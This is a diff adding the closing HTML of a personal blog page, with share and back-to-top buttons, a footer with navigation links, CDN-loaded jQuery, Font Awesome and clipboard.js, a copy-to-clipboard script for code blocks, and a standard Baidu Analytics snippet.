+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    bxz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
